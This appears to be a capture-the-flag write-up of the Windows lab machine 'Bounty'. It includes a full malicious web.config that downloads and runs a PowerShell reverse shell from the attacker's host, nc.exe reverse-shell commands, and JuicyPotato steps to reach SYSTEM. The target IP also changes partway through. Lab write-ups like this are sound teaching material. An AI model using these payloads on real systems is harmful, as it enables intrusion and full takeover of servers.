# HTB Write-up: Bounty

**Difficulty:** Easy
**OS:** Windows
**Target IP:** 10.129.55.79
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning
Started with a fast port sweep using `rustscan`, followed by a detailed service scan with `nmap`.

```bash
rustscan -a 10.129.55.79
```

Result: only port 80 open.

```bash
nmap -sCV -T4 -p80 10.129.55.79
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Key takeaways:
- IIS 7.5 on Windows, single web service exposed.
- `X-Powered-By: ASP.NET` observed on the site, indicating server-side pages would use the `.aspx` extension.

---

## 2. Web Enumeration

Ran a content discovery scan against the web root, extending the wordlist with extensions relevant to an ASP.NET stack:

```bash
feroxbuster -u http://10.129.55.79/ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -x .php,.aspx,.txt,.html
```

Notable results:

| Status | Path | Notes |
|--------|------|-------|
| 200 | `/merlin.jpg` | Static image |
| 200 | `/` | Site root |
| 200 | `/transfer.aspx` | File upload page |
| 400 | `/*checkout*.aspx` | Unclear/blocked route |

`/transfer.aspx` stood out immediately — it's a file upload form, which is the most promising route to code execution.

---

## 3. Exploitation — Foothold

### 3.1 Bypassing the Upload Filter

Visiting `http://10.129.55.79/transfer.aspx` presented a basic upload form. A direct `.aspx` reverse shell was rejected with **"Invalid File. Please try again."**, indicating an extension filter/whitelist was in place.

Using Burp Suite, I tested a range of extensions to map out what the filter would accept:

- `.aspx`
- `.txt`
- `.php`
- `.config`
- `.html`
- `.sh`
- `.rb`
- `.exe`
- `.asax`
- `.yml`

Out of all of these, **`.config` was accepted** — returning an HTTP 200 with the "File uploaded successfully" response.

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET
...
<span id="Label1" style="color:Green;">File uploaded successfully.</span>
```

### 3.2 Why `.config` Matters

On IIS, `web.config` files aren't just passive configuration — they can register **handler mappings** that tell IIS how to process specific file extensions. By uploading a malicious `web.config`, IIS can be tricked into executing it as classic ASP (via `asp.dll`), giving code execution even though `.aspx`/`.asp` uploads were blocked.

I based the payload on a known technique from the [OffensiveReverseShellCheatSheet](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config), adjusted for this target:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write"
              preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.15.146/Invoke-PowerShellTcp.ps1')")
%>
```

This file both **re-enables `.config` execution as classic ASP** and embeds a VBScript payload that shells out to PowerShell, downloading and executing a reverse shell script hosted on my attacking machine.

### 3.3 Staging the Payload

Used the [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) `Invoke-PowerShellTcp.ps1` script, appending the call-back trigger at the end:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.146 -Port 443
```

Served it (along with the crafted `web.config`) via a simple HTTP server:

```bash
python3 -m http.server 80
```

### 3.4 Triggering the Shell

Uploaded `web.config` through `/transfer.aspx`, then browsed to:

```
http://10.129.55.94/uploadedfiles/web.config
```

The upload triggers IIS to execute the embedded VBScript, which fetches and runs the PowerShell reverse shell:

```
10.129.55.94 - - [05/Aug/2026 06:59:02] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Caught the callback with a Netcat listener:

```bash
rlwrap nc -lvnp 443
```

```
listening on [any] 443 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.55.94] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY

PS C:\windows\system32\inetsrv> whoami
bounty\merlin
```

✅ Foothold obtained as `bounty\merlin`.

### 3.5 User Flag

```
PS C:\Users\merlin\Desktop> gci -Force

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a-hs         5/30/2018  12:22 AM        282 desktop.ini
-arh-          8/5/2026   9:54 AM         34 user.txt
```

---

## 4. Privilege Escalation

### 4.1 Enumerating Privileges

```
PS C:\Users\merlin\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` being **enabled** is the classic indicator for a Potato-family token impersonation exploit (this machine predates the patches that later required JuicyPotatoNG/PrintSpoofer, so the original **JuicyPotato** still works here).

### 4.2 Staging JuicyPotato

Downloaded the exploit binary on Kali and served it over the same HTTP server used earlier:

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
python3 -m http.server 80
```

Pulled it down to the target and confirmed it worked:

```
PS C:\Windows\Temp> .\JuicyPotato.exe -t * -p cmd.exe -a "whoami" -l 1337
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

This confirmed SYSTEM-level impersonation was achievable, but `CreateProcessWithTokenW` didn't produce a process suitable for attaching an interactive Netcat shell to.

### 4.3 Getting an Interactive SYSTEM Shell

Switched to the `-t u` flag to force `CreateProcessAsUser` instead of `CreateProcessWithTokenW`. This creates a process whose stdin/stdout attach correctly to Netcat for an interactive shell:

```
PS C:\Windows\Temp> .\JuicyPotato.exe -t u -l 1337 -p C:\Windows\Temp\nc.exe -a "-e C:\Windows\System32\cmd.exe 10.10.15.146 4444"
```

Caught the SYSTEM shell:

```bash
rlwrap nc -lvnp 4444
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.55.94] 49319
Microsoft Windows [Version 6.1.7600]

C:\>whoami
whoami
nt authority\system
```

✅ SYSTEM access obtained.

---

## 5. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → single IIS 7.5 / ASP.NET service on port 80 |
| Enumeration | `feroxbuster` → discovered `/transfer.aspx` upload form |
| Foothold | Bypassed extension filter with `.config`; abused IIS handler mapping to execute a malicious `web.config` as classic ASP, triggering a PowerShell reverse shell (Nishang) |
| Privilege Escalation | `SeImpersonatePrivilege` enabled → JuicyPotato token impersonation (COM server abuse) → SYSTEM |

**Root cause / lessons learned:**
- The upload form only filtered by *extension*, and did so incompletely — `.config` was never blocked despite being just as dangerous as `.aspx` on IIS, since it can carry executable handler mappings.
- Content-type/extension whitelisting must be paired with strict file-content validation, and web application pools should run with the minimum privileges necessary — `SeImpersonatePrivilege` should be stripped from service accounts wherever possible to prevent Potato-style privilege escalation.
- On the exploitation side, `-t u` was used to force `CreateProcessAsUser` instead of letting JuicyPotato choose automatically (`-t *`) or fall back to `CreateProcessWithTokenW`. The default `whoami` test confirmed SYSTEM impersonation worked via `CreateProcessWithTokenW`, but that API creates a process under a primary token that doesn't reliably attach its stdin/stdout/stderr to a piped tool like Netcat — the shell would authenticate as SYSTEM but never become interactive. `CreateProcessAsUser` (forced with `-t u`) creates the process in a way that correctly inherits the handles passed to it, so `nc.exe -e cmd.exe` could bind properly and hand back a usable interactive SYSTEM shell.

---

## 6. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `feroxbuster` — content discovery
- Burp Suite — upload filter fuzzing
- Custom `web.config` (ASP handler abuse) — foothold
- [Nishang `Invoke-PowerShellTcp.ps1`](https://github.com/samratashok/nishang) — reverse shell
- [JuicyPotato](https://github.com/ohpe/juicy-potato) — privilege escalation
- Netcat (`rlwrap nc`) — shell handling
